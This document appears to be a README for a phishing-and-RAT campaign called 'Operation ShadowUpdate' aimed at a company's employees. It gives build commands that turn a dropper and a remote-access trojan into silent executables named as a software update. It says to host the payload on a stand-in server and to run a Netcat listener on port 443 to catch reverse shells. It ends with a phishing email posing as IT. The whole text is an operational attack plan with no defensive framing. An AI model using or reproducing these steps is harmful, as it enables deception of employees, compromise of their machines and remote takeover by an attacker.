# Operation ShadowUpdate

## Scenario
Company X employees are targeted via a phishing email disguised as a mandatory software update from IT. Victims download and run `SoftwareUpdate.exe`, a dropper that installs a custom RAT.

## Components
- **dropper.py** → Downloads + runs the RAT silently, shows fake success popup.
- **rat.py** → Persistent RAT with remote shell capability.
- **email_template.txt** → Phishing lure template.

## Execution
1️⃣ Compile dropper + RAT to build a single silent exe for the dropper and the RAT (no need for python on target machine)
```bash
pyinstaller --onefile --noconsole dropper.py
pyinstaller --onefile --noconsole --name SoftwareUpdate rat.py
```
2️⃣ Host `SoftwareUpdate.exe` on `http://yourserver.com/SoftwareUpdate.exe`
3️⃣ On the attacker machine, run a Netcat listener to accept connections from the RAT:
```bash
nc -lvnp 443
```
Where:
- `-l` → Listen for incoming connections
- `-v` → Verbose output (shows connection info)
- `-n` → Do not resolve DNS (faster)
- `-p 443` → Listen on port 443 (must match RAT's configured port)

Ensure port 443 is open on the attacker's firewall/router.


4️⃣ Deliver `SoftwareUpdate.exe` to target using an email.

## Example Phishing Email
```
From: it-support@companyx.com
Subject: URGENT: Security Update Required

Dear employee,

A critical security patch is required. Download and run the attached SoftwareUpdate.exe immediately.
Trust us. We’re the IT department.

IT Security Team
Company X
```
